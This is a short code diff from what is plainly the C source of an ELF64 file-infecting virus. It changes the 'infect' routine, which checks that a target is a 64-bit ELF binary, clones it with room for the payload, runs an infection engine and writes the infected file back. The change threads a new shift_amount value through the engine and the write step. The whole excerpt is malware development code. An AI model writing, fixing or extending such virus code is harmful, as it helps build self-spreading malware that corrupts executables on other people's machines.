@@ -34,14 +34,15 @@ inline bool	infect(const struct virus_header *vhdr, const char *file)
 	struct safe_ptr		clone_ref  = {.ptr = NULL, .size = 0};
 	struct virus_header	local_vhdr = *vhdr;
 	size_t			extra_size = local_vhdr.full_virus_size * 2;
+	size_t			shift_amount = 0;
 
 	log_try_infecting(file);
 
 	if (!is_elf64(file)
 	|| !init_file_safe(&file_ref, file)
 	|| !init_clone_safe(&clone_ref, file_ref.size, extra_size)
-	|| !infection_engine(&local_vhdr, clone_ref, file_ref)
-	|| !write_file((struct safe_ptr){clone_ref.ptr, file_ref.size + ALIGN(local_vhdr.full_virus_size, PAGE_ALIGNMENT)}, file))
+	|| !infection_engine(&local_vhdr, clone_ref, file_ref, &shift_amount)
+	|| !write_file(clone_ref, file_ref.size + shift_amount, file))
 	{
 		free_accessor(&file_ref);
 		free_accessor(&clone_ref);
